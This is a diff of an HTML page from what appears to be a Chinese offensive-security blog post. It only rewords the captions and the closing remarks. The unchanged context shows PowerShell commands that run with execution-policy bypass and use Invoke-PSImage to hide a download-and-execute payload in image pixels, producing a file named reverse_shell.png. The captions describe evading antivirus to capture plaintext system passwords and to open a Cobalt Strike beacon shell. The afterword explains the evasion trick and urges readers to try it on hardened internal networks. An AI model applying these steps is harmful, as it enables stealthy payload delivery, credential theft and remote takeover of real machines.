@@ -160,11 +160,11 @@
 
         <!-- Post Content -->
         <figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//github.com/klionsec/Invoke-PSImage</span></div><div class="line">C:\&gt;powershell -exec bypass</div><div class="line">PS C:\&gt; Import-Module .\Invoke-PSImage<span class="selector-class">.ps1</span></div><div class="line">PS C:\&gt; Invoke-PSImage -Script .\Download-Execute-PS<span class="selector-class">.ps1</span> -Image .\large<span class="selector-class">.JPG</span> -Out .\reverse_shell<span class="selector-class">.png</span> -Web</div></pre></td></tr></table></figure>
-<p>免杀抓明文</p>
+<p>免杀抓取系统用户明文密码</p>
 <p><img src="/img/remote ps code.gif" alt=""><br><a id="more"></a></p>
-<p>免杀弹shell</p>
+<p>免杀弹回一个beacon的shell</p>
 <p><img src="/img/remote beacon sehll ps.gif" alt=""></p>
-<p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;逛facebook无意看到的,觉得还不错,顺便拿过来跟大家分享下,脚本主要作用就是<code>把payload数据分散存到图片的每个像素中</code>,最后到远端执行时,再重新遍历重组像素中的payload代码来执行,具体看脚本和触发代码即可知,不得不说,思路非常好,哼哼…其实,除了图片能存数据,还有其他很多的地方也都能存,这样也确实有一定的免杀效果,但nod实测还是会被捕捉到,可能是<code>download</code>时被发现到了,对于一些比较变态的内网环境,大家不妨尝试下,毕竟,无痕执行相对还是比较好的,另外,图片像素务必要大,大到能完整装下你的payload,能深入衍生利用的空间还很大,大家可自行尝试,废话不多说,祝,好运 ^_^</p>
+<p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;逛facebook无意看到的,觉得还不错,顺便拿过来跟大家分享下,脚本主要作用就是<code>把payload数据分散存到图片的每个像素中</code>,最后到远端执行时,再重新遍历重组像素中的payload代码来执行,具体看脚本和触发代码即可知,不得不说,思路非常好,哼哼…其实,除了图片能存数据,还有其它很多的地方也都能存,这样也确实有一定的免杀效果,但nod实测时还是会被捕捉到,可能是<code>download</code>时被发现到了,对于一些比较变态的内网环境,大家不妨尝试下,毕竟,无痕执行相对还是比较好的,另外,图片像素务必要大,大到能完整装下你的payload,可继续深度利用的空间还很大,大家不妨自行尝试,废话不多说,祝,好运 ^_^</p>
 
     </div>
 
